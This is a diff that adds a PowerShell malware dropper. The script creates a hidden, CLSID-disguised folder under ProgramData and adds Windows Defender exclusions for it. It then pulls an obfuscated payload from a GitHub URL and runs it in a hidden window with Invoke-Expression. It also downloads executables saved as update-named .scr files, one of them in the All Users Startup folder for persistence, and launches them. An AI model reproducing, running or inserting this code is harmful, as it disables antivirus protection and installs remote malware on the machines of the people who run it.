@@ -1,1 +1,28 @@
 
+$rdir = "$env:SystemDrive\ProgramData\Loader"
+$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
+New-Item -ItemType Directory -Path $dir
+Add-MpPreference -ExclusionPath $dir
+attrib +h +s $dir
+
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
+$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClienta.exe"
+$output = "$dir\Updatecli4mt.scr"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process $output
+
+$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
+$output = "$startupfolder\Updateclient.scr"
+Add-MpPreference -ExclusionPath $output
+
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process $output
+    Write-Host "Tệp đã được tải về thành công."
+}
